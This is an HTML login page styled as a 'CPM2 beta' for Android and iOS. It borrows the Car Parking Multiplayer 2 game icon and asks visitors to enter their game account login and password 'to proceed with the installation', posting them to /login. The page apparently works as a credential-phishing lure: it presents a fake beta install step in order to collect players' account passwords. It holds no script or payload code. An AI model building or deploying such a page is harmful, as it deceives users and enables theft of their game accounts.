<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CPM2 Beta Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;800&family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            position: relative;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            font-family: 'Open Sans', sans-serif;
            overflow: hidden;
            background-color: #f0f0f0; 
        }

        body::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background-image: url('https://cdn-icon.bluestacks.com/DZiFcf3kh0c40RFSk-lCgkKBeefAtvd_rnu1jVMWznRMGkp7kTgOimH-79YkmXcdYg0=s0');
            background-size: cover;
            background-position: center;
            opacity: 0.3;
            z-index: -1;
        }

        .container {
            width: 100%;
            max-width: 800px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            padding: 20px;
        }

        h1 {
            font-family: 'Montserrat', sans-serif;
            font-size: 3.5rem;
            font-weight: 800;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }

        .text-white { color: #FFFFFF; }
        .text-yellow { color: #FFC107; } 

        .icon-logo {
            width: 180px;
            height: auto;
            border-radius: 10px;
            margin-bottom: 30px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 15px;
            width: 100%;
            max-width: 450px;
            margin-bottom: 40px;
        }

        .input-group {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            width: 100%;
        }

        /* Largura fixa adicionada aqui para forçar o alinhamento das caixas */
        .input-group label {
            font-family: 'Montserrat', sans-serif;
            font-size: 2rem;
            font-weight: 700;
            color: #000000;
            width: 160px; 
            text-align: right; 
        }

        .input-group input {
            flex: 1;
            padding: 10px 15px;
            font-size: 1.2rem;
            border: 2px solid rgba(0, 0, 0, 0.2);
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.8);
            outline: none;
            transition: 0.3s;
        }

        .input-group input:focus {
            background: #ffffff;
            border-color: #FFC107;
        }

        button[type="submit"] {
            margin-top: 15px;
            padding: 12px 20px;
            font-family: 'Montserrat', sans-serif;
            font-size: 1.5rem;
            font-weight: 800;
            color: #000000;
            background-color: #FFC107;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
            text-transform: uppercase;
        }

        button[type="submit"]:hover {
            background-color: #e0a800;
        }

        .footer-text {
            font-size: 1.1rem;
            color: #222222;
            font-weight: 600;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1><span class="text-white">CPM</span><span class="text-yellow">2 beta Android/Ios</span></h1>
        
        <img src="https://play-lh.googleusercontent.com/oCYZs3vR72j0dAo2K2Q7PPQuYg_q_GRUfqwBgWX_tVgh4j4yODpc-JIJUEoe5P5nKZjHDm17Wh1ANNAi6pevWg" alt="CPM2 Icon" class="icon-logo">

        <form action="/login" method="POST">
            <div class="input-group">
                <label for="usuario">login:</label>
                <input type="text" id="usuario" name="usuario" required>
            </div>
            <div class="input-group">
                <label for="senha">password:</label>
                <input type="password" id="senha" name="senha" required>
            </div>
            
            <button type="submit">enter</button>
        </form>

        <p class="footer-text">Enter your Car Parking 2 account details to proceed with the installation.</p>
    </div>

</body>
</html>
